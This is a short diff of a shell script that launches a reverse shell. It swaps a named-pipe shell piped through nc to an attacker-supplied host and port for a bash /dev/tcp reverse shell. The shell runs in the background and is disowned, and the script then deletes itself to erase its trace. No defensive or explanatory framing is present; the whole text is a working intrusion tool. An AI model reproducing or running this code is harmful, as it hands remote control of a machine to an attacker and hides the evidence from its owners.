@@ -2,9 +2,6 @@
 A="$0"
 H=$1
 P=$2
-rm -rf ~/.a/
-mkdir -p ~/.a/
-mknod ~/.a/p p
-/bin/sh -c /bin/sh 0<~/.a/p | nc $H $P 1>~/.a/p &
+/bin/bash -c /bin/bash -i > /dev/tcp/$H/$P 0<&1 2>&1 &
 disown $!
 rm -f "$A"
